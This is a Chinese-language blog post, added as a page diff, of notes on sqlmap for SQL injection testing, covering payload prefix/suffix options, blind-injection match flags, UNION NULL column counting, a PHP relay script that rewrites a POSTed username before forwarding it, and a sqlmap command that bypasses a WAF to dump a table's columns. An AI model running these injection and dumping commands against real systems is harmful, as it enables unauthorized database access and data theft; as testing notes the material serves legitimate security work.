@@ -1,0 +1,359 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>Sqlmap备忘录 | 😊#</title>
+  <meta name="author" content="JKme">
+  
+  <meta name="description" content="2017-1-11更新：原来的时候下面这一坨代码用了半个小时写出来，PHP比较渣，变查边写边用burp调试。
+其实需求很简单，就是在sqlmap的每个payload后面写入特定字符，昨天的时候看到这篇文章才发现sqlmap已经有选项了，感觉自己蠢蠢嗒- -
+http://www.thegreycorner.com/2017/01/exploiting-difficult-sql-injection.html
+
+The prefix (–prefix) and suffix (–suffix) options configure the strings that should be included with each SQL injection payload in order to begin, and then terminate, the Injection. 
+
+--prefix --suffix 是每次添加在payload的数据，一个前置，一个后置
+
+###在注入测试的时候union查询用的是NULL?
+
+Why use NULL values in the UNION SELECT? NULL is a great value to use in UNIONS when trying to determine the correct number of columns in an injection, as it can sit in place of a number of different field types, such as numbers, strings and dates.
+
+###使用具体的payload如果知道了注入点是在order by，可以添加这样的选项:--test-filter=&amp;#39;ORDER BY&amp;#39;
+###--string &amp;amp; --not-stringBlind injection的时候，有这样的选项：
+--string
+--not-string
+在true或者false要判断的字符
+
+--regexp 使用的正则表达
+--code 根据HTTP状态来判断
+--text-only 比较回应的文本
+--title 比较回应的title
+
+其中作者说明了使用--string或者--not-string的时候可以使用Python里面的十六进制换行来匹配比如newline(\x0a)和tabs(\x09)
+
+--string&amp;#x3D;&amp;quot;Name\x0a\x09\x09Stephen&amp;quot;"> 
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="Sqlmap备忘录"/>
+  <meta property="og:site_name" content="😊#"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+  <link rel="stylesheet" href="/css/prism-atom-dark.css" media="screen" type="text/css">
+    <link rel="stylesheet" href="/css/prism-line-numbers.css" media="screen" type="text/css">
+  <script src="/js/jquery-2.0.3.min.js"></script>
+<!--   <script src="/js/highlight.min.js"></script>
+  <script>hljs.highlightAll();</script>
+  <link rel="stylesheet" href="/css/highlight/styles/atom-one-dark.min.css" media="screen" type="text/css"> -->
+
+  <!-- analytics -->
+  
+
+
+
+
+<meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="😊#" type="application/atom+xml">
+</head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">😊#</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class=""></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/project" title="All the categories.">
+			  <i class=""></i>Projects
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/atom.xml" title="Subscribe me.">
+			  <i class="fa fa-rss"></i>RSS
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> Sqlmap备忘录</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <p>2017-1-11更新：<br>原来的时候下面这一坨代码用了半个小时写出来，PHP比较渣，变查边写边用burp调试。</p>
+<p>其实需求很简单，就是在sqlmap的每个payload后面写入特定字符，昨天的时候看到这篇文章才发现sqlmap已经有选项了，感觉自己蠢蠢嗒- -</p>
+<p><a target="_blank" rel="noopener" href="http://www.thegreycorner.com/2017/01/exploiting-difficult-sql-injection.html">http://www.thegreycorner.com/2017/01/exploiting-difficult-sql-injection.html</a></p>
+<blockquote>
+<p>The prefix (–prefix) and suffix (–suffix) options configure the strings that should be included with each SQL injection payload in order to begin, and then terminate, the Injection. </p>
+</blockquote>
+<pre class="line-numbers language-none"><code class="language-none">--prefix --suffix 是每次添加在payload的数据，一个前置，一个后置<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>###在注入测试的时候union查询用的是NULL?</p>
+<blockquote>
+<p>Why use NULL values in the UNION SELECT? NULL is a great value to use in UNIONS when trying to determine the correct number of columns in an injection, as it can sit in place of a number of different field types, such as numbers, strings and dates.</p>
+</blockquote>
+<p>###使用具体的payload<br>如果知道了注入点是在order by，可以添加这样的选项:<code>--test-filter=&#39;ORDER BY&#39;</code></p>
+<p>###<code>--string</code> &amp; <code>--not-string</code><br>Blind injection的时候，有这样的选项：</p>
+<pre class="line-numbers language-none"><code class="language-none">--string
+--not-string
+在true或者false要判断的字符
+
+--regexp 使用的正则表达
+--code 根据HTTP状态来判断
+--text-only 比较回应的文本
+--title 比较回应的title
+
+其中作者说明了使用--string或者--not-string的时候可以使用Python里面的十六进制换行来匹配比如newline(\x0a)和tabs(\x09)
+
+--string&#x3D;&quot;Name\x0a\x09\x09Stephen&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>###自动选择Y<br>注入的时候sqlmap会询问是Y或者N之类的，有这么一个选择可以：</p>
+<p><code>--answers=&#39;optimize=Y&#39;</code></p>
+<p>另外一个是<code>--flush-session</code>刷新注入的session</p>
+<p>最后一段是作者的经验，往往这个最重要，OK。下一集作者会写几个例子，关注下。</p>
+<hr>
+<hr>
+<p>不晓得能不能成，就记录东西啦，不管是菜刀还是sqlmap，走的流量都是http协议，<br>最后判断的依据都是http页面上的内容。</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;?php
+set_time_limit(0);
+$host &#x3D; &quot;&quot;;
+$useragent&#x3D;&quot;Mozilla&#x2F;4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;;
+
+$data&#x3D;$_POST;
+$u &#x3D; $_POST[&quot;username&quot;];
+$u &#x3D; $u.&quot; # between&quot;;
+$re &#x3D; array(&quot;username&quot; &#x3D;&gt; $u);
+$pack &#x3D; array_replace($data,$re);
+$ch &#x3D; curl_init();
+
+curl_setopt($ch,CURLOPT_URL,$host);
+curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
+curl_setopt($ch,CURLOPT_POST, 1);
+curl_setopt($ch,CURLOPT_POSTFIELDS, $pack);
+curl_setopt($ch,CURLOPT_TIMEOUT, 25);
+curl_setopt($ch,CURLOPT_USERAGENT, $useragent);
+curl_setopt($ch,CURLOPT_HTTPHEADER,array(
+	&#39;Accept-Language: zh-cn&#39;,
+	&#39;Connection: Keep-Alive&#39;,
+	&quot;referer: $host&quot;));
+$return &#x3D; curl_exec($ch);
+echo $return;
+?&gt;
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>=====</p>
+<pre class="line-numbers language-none"><code class="language-none">可以先--count下看看总的数据量，然后再查看特定的内容
+sqlmap -r ~&#x2F;Desktop&#x2F;11.txt -v 5 --technique E  --delay 3 --proxy&#x3D;http:&#x2F;&#x2F;127.0.0.1:8080  --dbms&#x3D;MySql  --dbs --skip-waf --dump -T e_order -C id,bid,uid --start &lt;&gt; --stop &lt;&gt;
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>–force-ssl 强制https，在使用<code>-r</code>选项的时候非常有用</p>
+
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	
+	<span id="/2017/01/03/sql%E4%B8%AD%E8%BD%AC.html" class="leancloud-visitors view" data-flag-title="Sqlmap备忘录">
+		<em class="post-meta-item-text"> Page View </em> <i class="leancloud-visitors-count"></i>
+	</span>
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a href="/2017/01/04/加密webshell流量.html" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2016/12/28/php的zip伪协议.html" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2017-01-03 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/SQL/">SQL<span>7</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
+	   <div id="toc" class="toc collapse in">
+		   <span class="toc-title">Contents</span>
+			
+		</div>
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2022 JKme's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
